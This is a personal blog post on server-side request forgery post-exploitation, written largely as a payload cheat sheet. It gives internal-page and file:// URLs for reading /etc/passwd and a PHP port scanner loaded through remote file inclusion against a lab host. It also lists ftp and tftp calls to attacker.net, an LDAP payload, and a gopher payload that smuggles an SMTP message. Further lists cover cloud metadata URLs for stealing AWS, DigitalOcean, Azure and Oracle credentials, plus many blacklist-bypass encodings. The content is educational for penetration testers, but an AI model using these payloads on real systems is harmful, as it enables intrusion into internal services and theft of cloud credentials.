# Welcome to the Blog!
Hi! I'm Shubham Dubey and this is my first blog in which i will try to explain post exploitation techniques of old famous Web-Attacks.

# SSRF

In a Server-Side Request Forgery (SSRF) attack, the attacker can abuse functionality on the server to read or update internal resources. The attacker can supply or modify a URL which the code running on the server will read or submit data to, and by carefully selecting the URLs, the attacker may be able to read server configuration such as AWS metadata, connect to internal services like http enabled databases or perform post requests towards internal services which are not intended to be exposed.

## **Attacks**

There are two main types of SSRF attacks. The first is where the attack is done against the server itself by using a loopback network interface (`127.0.0.1` or `localhost`).  
  
The second is where the trust relationship between the abused server being attacked and other devices on the same network that can’t be accessed through other means. Or even using that server to gather information about the cloud provider that is being used (`AWS, GCE, Azure...`).

### **Attack Surface Analysis**

The target application may have functionality for importing data from a URL, publishing data to a URL or otherwise reading data from a URL that can be tampered with. SSRF is injected into any parameter that accepts a URL or a file. The attacker modifies the calls to this functionality by supplying a completely different URL or by manipulating how URLs are built (path traversal etc.) i.e When injecting SSRF payloads in a parameter that accepts a file, the attacker has to change `Content-Type` to `text/plain` and then inject the payload instead of a file.

When the manipulated request goes to the server, the server-side code picks up the manipulated URL and tries to read data to the manipulated URL. By selecting target URLs the attacker may be able to read data from services that are not directly exposed on the internet:

![enter image description here](https://raw.githubusercontent.com/ShubhamDubeyy/Route-To-Toor/gh-pages/SSRF_diagram.png)


### **Common Post Exploitation Methodology Followed**

Accessing internal resources can mean a couple of different things. It can be achieved by accessing the `/admin` panel that is only accessible from within the internal network. Reading files from the server. This can be done using the file schema (`file://path/to/file`).

![enter image description here](https://raw.githubusercontent.com/ShubhamDubeyy/Route-To-Toor/gh-pages/etc.png)

#### **Internal pages**

Some common exploits for accessing internal pages include:  
  
`https://target.com/page?url=http://127.0.0.1/admin  
https://target.com/page?url=http://127.0.0.1/phpmyadmin  
https://target.com/page?url=http://127.0.0.1/pgadmin  
https://target.com/page?url=http://127.0.0.1/any_interesting_page`


#### **Internal files via URL scheme**

Attacking the URL scheme allows an attacker to fetch files from a server and attack internal services.  
  
Some common exploits for accessing internal files include:  
  
`https://target.com/page?url=file://etc/passwd  
https://target.com/page?url=file:///etc/passwd  
https://target.com/page?url=file://\/\/etc/passwd  
https://target.com/page?url=file://path/to/file`

#### **Internal services via URL scheme**

First find the open port on system using Bruteforce (https://cobalt.io/blog/from-ssrf-to-port-scanner). Then we can use a URL scheme to connect to certain services.

Following is the remote malicious code that make this attack port scanning

```<?php
if (isset($_GET["ip"])) {
    $ports = array(21, 22, 23, 25, 53, 80, 443, 3306);
    foreach ($ports as $port) {
        $service = getservbyport($port, "tcp");
        if($pf = @fsockopen($_GET["ip"], $port, $err, $err_string, 1)) {
            echo "Port $port($service)" . ": <span style='color:green'>Open</span><br>";
            fclose($pf);
        }
        else {
            echo "Port $port($service)" . ": <span style='color:red'>Inaccessible</span><br>";
        }

    }
}

?>
```

Let’s attack port scans on the internal network using RFI

http://192.168.28.129/bWAPP/rlfi.php?language=http://192.168.28.1:8888/ssrf_port_scan.txt&ip=192.168.28.129&action=go

192.168.28.129 is a is victim address

Sample output:

![](https://hydrasky.com/wp-content/uploads/2016/12/ssrf6.png)
 Or we can use Burpsuite to breuteforce the vulnerability. 
  ![enter image description here](https://raw.githubusercontent.com/ShubhamDubeyy/Route-To-Toor/gh-pages/SSRF8.png)
For file transfer protocols:  

`https://target.com/page?url=ftp://attacker.net:11211/  
https://target.com/page?url=sftp://attacker.net:11111/  
https://target.com/page?url=tftp://attacker.net:123456/TESTUDP`

![enter image description here](https://raw.githubusercontent.com/ShubhamDubeyy/Route-To-Toor/gh-pages/url.png)

![enter image description here](https://raw.githubusercontent.com/ShubhamDubeyy/Route-To-Toor/gh-pages/protocols.png)

### **Post Exploitation Methodology We Should Follow**
- LDAP

- GOPHER
- Cross-Site Port Attack (XSPA)


- **LDAP** : LDAP (Lightweight Directory Access Protocol) is an open and cross platform protocol used for directory services authentication.
LDAP provides the communication language that applications use to communicate with other directory services servers. Directory services store the users, passwords, and computer accounts, and share that information with other entities on the network

***Abusing LDAP***  
  
`https://target.com/page?url=ldap://127.0.0.1/%0astats%0aquit  
https://target.com/page?url=ldap://localhost:11211/%0astats%0aquit`  
  
`Makes request like:  
stats  
quit`


- **GOPHER** : The **Gopher** protocol [/ˈɡoʊfər/](https://en.wikipedia.org/wiki/Help:IPA/English "Help:IPA/English") is a [communications protocol](https://en.wikipedia.org/wiki/Communications_protocol "Communications protocol") designed for distributing, searching, and retrieving documents in [Internet Protocol](https://en.wikipedia.org/wiki/Internet_Protocol "Internet Protocol") networks. The design of the Gopher protocol and user interface is menu-driven, and presented an alternative to the [World Wide Web](https://en.wikipedia.org/wiki/World_Wide_Web "World Wide Web") in [its early stages](https://en.wikipedia.org/wiki/History_of_the_World_Wide_Web "History of the World Wide Web"), but ultimately fell into disfavor, yielding to the [HTTP](https://en.wikipedia.org/wiki/Hypertext_Transfer_Protocol "Hypertext Transfer Protocol"). The Gopher ecosystem is often regarded as the effective predecessor of the World Wide Web.[[1]](https://en.wikipedia.org/wiki/Gopher_(protocol)#cite_note-1)

***Abusing Gopher***  
  
`https://target.com/page?url=gopher://127.0.0.1:25/xHELO%20localhost%250d%250aMAIL%20FROM%3A%attacker@attack.net%3E%250d%250aRCPT%20TO%3A%3Cvictim@target.com%3E%250d%250aDATA%250d%250aFrom%3A%20%5BAttacker%5D%20%3Cattacker@attack.net%3E%250d%250aTo%3A%20%3Cvictime@target.com%3E%250d%250aDate%3A%20Fri%2C%2013%20Mar%202020%2003%3A33%3A00%20-0600%250d%250aSubject%3A%20Hacked%250d%250a%250d%250aYou%27ve%20been%20exploited%20%3A%28%20%21%250d%250a%250d%250a%250d%250a.%250d%250aQUIT%250d%250a`  
  
`Makes request like:  
HELO localhost  
MAIL FROM:<attacker@attack.net>  
RCPT TO:<victim@target.com>  
DATA  
From: [Attacker] <attacker@attack.net>  
To: <victim@target.com>  
Date: Fri, 13 Mar 2020 03:33:00 -0600  
Subject: Hacked  
  
You've been exploited :(`  
  
`.  
QUIT`

- **Cross-Site Port Attack (XSPA)** : 
Cross-Site Port Attack (XSPA) is a type of SSRF where an attacker is able to scan the server for its open ports. This is usually done by using the loopback interface on the server (`127.0.0.1` or `localhost`) with the addition of the port that is being scanned (`21, 22, 25...`).  
 
 ***Abusing XSPA***  
Some examples are:  
  
`https://target.com/page?url=http://localhost:22/  
https://target.com/page?url=http://127.0.0.1:25/  
https://target.com/page?url=http://127.0.0.1:3389/  
https://target.com/page?url=http://localhost:PORT/`  

![enter image description here](https://raw.githubusercontent.com/ShubhamDubeyy/Route-To-Toor/gh-pages/port.png)
  ![enter image description here](https://raw.githubusercontent.com/ShubhamDubeyy/Route-To-Toor/gh-pages/port2.png)
   
   ***Subnet Scan***  
   
Besides scanning for ports an attacker might also run a scan of running hosts by trying to ping private IP addresses:

-   `**192.168.0.0/16**`
-   `**172.16.0.0/12**`
-   `**10.0.0.0/8**`

Useful Links : https://ibreak.software/2012/11/cross-site-port-attacks-xspa-part-1/
## **Cloud provider**

With practically every business running on some kind of a cloud network and database, securing the cloud has never been more important, here are the most important reasons why.  With 96% of all enterprises in the U.S. Using some form of cloud computing, it’s clear that this technology has experienced a rapid proliferation in the past few years.

### **Cloud provider metadata**

With SSRF an attacker is able to read metadata of the cloud provider that you use, be it AWS, Google Cloud, Azure, DigitalOcean, etc. This is usually done by using the private addressing that the provider listed in their documentation.

#### **AWS**

For AWS instead of using `localhost` or `127.0.0.1` attackers use the `169.254.169.254` address for exploits.  
  
Significant information can be extracted from AWS metadata, from public keys, security credentials, hostnames, IDs, etc.  
  
Some common exploits include:  
  
`https://target.com/page?url=http://169.254.169.254/latest/user-data  
https://target.com/page?url=http://169.254.169.254/latest/user-data/iam/security-credentials/ROLE_NAME  
https://target.com/page?url=http://169.254.169.254/latest/meta-data  
https://target.com/page?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE_NAME  
https://target.com/page?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/PhotonInstance  
https://target.com/page?url=http://169.254.169.254/latest/meta-data/ami-id  
https://target.com/page?url=http://169.254.169.254/latest/meta-data/hostname  
https://target.com/page?url=http://169.254.169.254/latest/meta-data/public-keys  
https://target.com/page?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/dummy  
https://target.com/page?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/s3access  
https://target.com/page?url=http://169.254.169.254/latest/dynamic/instance-identity/document  
https://target.com/page?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/aws-elasticbeanorastalk-ec2-role`  
  
Additional links can be found in the [official documentation of AWS](https://docs.aws.amazon.com/index.html).

#### **DigitalOcean**

Similar to AWS, DigitalOcean uses `169.254.169.254` for their services and checks the [documentation](https://www.digitalocean.com/docs/) for more information.  
  
`https://target.com/page?url=http://169.254.169.254/metadata/v1.json  
https://target.com/page?url=http://169.254.169.254/metadata/v1/id  
https://target.com/page?url=http://169.254.169.254/metadata/v1/user-data  
https://target.com/page?url=http://169.254.169.254/metadata/v1/hostname  
https://target.com/page?url=http://169.254.169.254/metadata/v1/region  
https://target.com/page?url=http://169.254.169.254/metadata/v1/interfaces/public/0/ipv6/address`

#### **Azure**

Azure is more limited than other cloud providers in this regard. Check the [official documentation](https://docs.microsoft.com/en-us/azure/?product=featured) for more information.  
  
Azure requires header `Metadata: true`.  
  
`https://target.com/page?url=http://169.254.169.254/metadata/maintenance  
https://target.com/page?url=http://169.254.169.254/metadata/instance?api-version=2019-10-01  
https://target.com/page?url=http://169.254.169.254/metadata/instance/network/interface/0/ipv4/ipAddress/0/publicIpAddress?api-version=2019-10-01&format=text`

#### **Oracle Cloud**

Oracle cloud uses the `192.0.0.192` address.  
  
`https://target.com/page?url=http://192.0.0.192/latest/  
https://target.com/page?url=http://192.0.0.192/latest/meta-data/  
https://target.com/page?url=http://192.0.0.192/latest/user-data/  
https://target.com/page?url=http://192.0.0.192/latest/attributes/`

### **Bypasses**

One way to protect against SSRF is to blacklist certain domains and IP addresses. Yet, blacklisting isn’t really a good defense technique as hackers can use bypasses to avoid your security measures.

#### **Bypass using HTTPS**

Common blacklists blocking everything on port `80` or the `http` scheme. but the server will handle requests to `443` or `https` just fine.  
  
Instead of using `http://127.0.0.1/` use: `https://127.0.0.1/ https://localhost/`

#### **Bypass localhost**

The most common blacklist is blacklisting IP addresses like `127.0.0.1` or localhost. To bypass these blacklists you can use:

-   With `[::]`, abuses IPv6 to exploit
    -   `**http://[::]/**`
    -   `**http://[::]:80/**`
    -   `**http://0000::1/**`
    -   `**http://0000::1:80/**`
-   With domain redirection, useful when all IP addresses are blacklisted
    -   `**http://localtest.me**`
    -   `**http://test.app.127.0.0.1.nip.io**`
    -   `**http://test-app-127-0-0-1.nip.io**`
    -   `**httP://test.app.127.0.0.1.xip.io**`
-   With CIDR, useful when just `127.0.0.1` is whitelisted
    -   `**http://127.127.127.127/**`
    -   `**http://127.0.1.3/**`
    -   `**https:/127.0.0.0/**`
-   With IPv6/IPv4 address embedding, useful when both IPv4 and IPv6 are blacklisted (but blacklisted badly)
    -   `**http://[0:0:0:0:0:ffff:127.0.0.1]/**`
-   With decimal IP location, really useful if dots are blacklisted
    -   `**http://0177.0.0.1/ --> (127.0.0.1)**`
    -   `**http://2130706433/ --> (127.0.0.1)**`
    -   `**http://3232235521/ --> (192.168.0.1)**`
    -   `**http://3232235777/ --> (192.168.1.1)**`
-   With malformed URLs, useful when port is blacklisted
    -   `**localhost:+11211aaa**`
    -   `**localhost:00011211aaaa**`
    -   `**localhost:11211**`
-   With shorthanding IP addresses by dropping zeros, useful when full IP address is whitelisted
    -   `**http://0/**`
    -   `**http://127.1/**`
    -   `**http://127.0.1/**`
-   With enclosed alphanumerics, useful when just plain ASCII characters are blacklisted but servers interpret enclosed alphanumerics as normal.
    -   `**http://①②⑦.⓪.⓪.①/**`
    -   `**http://⓵⓶⓻.⓪.⓪.⓵/**`
-   With bash variables (cURL only)
    -   `**curl -v "http://attacker$google.com"; $google = ""**`
-   Against weak parsers (these go to `http://127.2.2.2:80`)
    -   `**http://127.1.1.1:80\@127.2.2.2:80/**`
    -   `**http://127.1.1.1:80\@@127.2.2.2:80/**`
    -   `**http://127.1.1.1:80:\@@127.2.2.2:80/**`
    -   `**http://127.1.1.1:80#\@127.2.2.2:80/**`

#### **Bypass 169.254.169.254 address**

The most common bypass for AWS addresses is changing them to get past the blacklist of `169.245.169.254`.

-   `http://169.254.169.254.xip.io/`
-   `**http://1ynrnhl.xip.io**`
-   `**http://425.510.425.510**` – dotted decimal with overflow
-   `**http://2852039166**` – dotless decimal
-   `**http://7147006462**` – dotless decimal with overflow
-   `**http://0xA9.0xFE.0xA9.0xFE**` – dotted hexadecimal
-   `**http://0xA9FEA9FE**` – dotless hexadecimal
-   `**http://0x41414141A9FEA9FE**` – dotless hexadecimal with overflow
-   `**http://0251.0376.0251.0376**` – dotted octal
-   `**http://0251.00376.000251.0000376**` – dotted octal with padding

## References

1.  [http://en.wikipedia.org/wiki/URI_scheme](http://en.wikipedia.org/wiki/URI_scheme)
    
2.  [http://en.wikipedia.org/wiki/List_of_TCP_and_UDP_port_numbers](http://en.wikipedia.org/wiki/List_of_TCP_and_UDP_port_numbers)
    
3.  [http://msdn.microsoft.com/en-us/library/system.uri.scheme.aspx](http://msdn.microsoft.com/en-us/library/system.uri.scheme.aspx)
    
4.  [http://search.cpan.org/~gaas/libwww-perl-6.04/lib/LWP.pm](http://search.cpan.org/~gaas/libwww-perl-6.04/lib/LWP.pm)
    
5.  [http://php.net/manual/en/wrappers.php](http://php.net/manual/en/wrappers.php)
    
6.  [http://docs.oracle.com/javase/1.5.0/docs/api/javax/print/attribute/standard/ReferenceUriSchemesSupported.html](http://docs.oracle.com/javase/1.5.0/docs/api/javax/print/attribute/standard/ReferenceUriSchemesSupported.html)
    
7.  [http://www.kernel.org/doc/man-pages/online/pages/man2/open.2.html](http://www.kernel.org/doc/man-pages/online/pages/man2/open.2.html)
    
8.  [http://media.blackhat.com/bh-us-11/Sullivan/BH_US_11_Sullivan_Server_Side_WP.pdf](http://media.blackhat.com/bh-us-11/Sullivan/BH_US_11_Sullivan_Server_Side_WP.pdf)
    
9.  [http://www.nostarch.com/download/tangledweb_ch3.pdf](http://www.nostarch.com/download/tangledweb_ch3.pdf)
    

## Tools

1.  [https://github.com/ONsec-Lab/scripts/blob/master/list-open-fd.c](https://github.com/ONsec-Lab/scripts/blob/master/list-open-fd.c)
    

## Researches

1.  [http://www.shmoocon.org/2008/presentations/Web%20portals,%20gateway%20to%20information.ppt](http://www.shmoocon.org/2008/presentations/Web%20portals,%20gateway%20to%20information.ppt)
    
2.  [http://www.slideshare.net/d0znpp/xxe-advanced-exploitation](http://www.slideshare.net/d0znpp/xxe-advanced-exploitation)
    
3.  [http://www.slideshare.net/d0znpp/caro2012-attack-largemodernwebapplications](http://www.slideshare.net/d0znpp/caro2012-attack-largemodernwebapplications)
    
4.  [http://media.blackhat.com/bh-us-12/Briefings/Polyakov/BH_US_12_Polyakov_SSRF_Business_Slides.pdf](http://media.blackhat.com/bh-us-12/Briefings/Polyakov/BH_US_12_Polyakov_SSRF_Business_Slides.pdf)
    
5.  [http://erpscan.com/wp-content/uploads/2012/11/SSRF.2.0.poc_.pdf](http://erpscan.com/wp-content/uploads/2012/11/SSRF.2.0.poc_.pdf)
    
6.  [http://www.riyazwalikar.com/2012/11/cross-site-port-attacks-xspa-part-2.html](http://www.riyazwalikar.com/2012/11/cross-site-port-attacks-xspa-part-2.html)
    
7.  [http://www.slideshare.net/d0znpp/ssrf-attacks-and-sockets-smorgasbord-of-vulnerabilities](http://www.slideshare.net/d0znpp/ssrf-attacks-and-sockets-smorgasbord-of-vulnerabilities)
    
8.  [http://erpscan.com/press-center/smbrelay-bible-7-ssrf-java-windows-love/](http://erpscan.com/press-center/smbrelay-bible-7-ssrf-java-windows-love/)
    
9.  [https://bugs.launchpad.net/ubuntu/+source/ffmpeg/+bug/1533367](https://bugs.launchpad.net/ubuntu/+source/ffmpeg/+bug/1533367)
